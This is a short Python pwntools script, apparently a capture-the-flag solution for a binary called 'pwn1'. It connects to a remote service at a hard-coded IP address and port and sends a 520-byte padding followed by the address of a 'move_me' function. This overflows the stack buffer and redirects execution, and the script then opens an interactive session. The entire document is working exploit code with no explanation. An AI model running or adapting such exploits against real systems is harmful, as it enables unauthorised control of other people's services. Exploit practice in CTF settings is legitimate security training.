from pwn import *
elf = ELF('./pwn1')

p = remote('115.127.114.85',8018)
#p = elf.process()
#context.terminal = ['tmux', 'splitw', '-h'] 
context.log_level = 'debug'

addr = elf.symbols.move_me
ret = ROP(elf).find_gadget(['ret'])[0]

p.recvuntil(b'This is my first C program :)\n')
payload = b"".join(
    [
        b"A"*520,
        p64(addr),
        b'\n',
    ]
)

p.send(payload)
p.interactive()
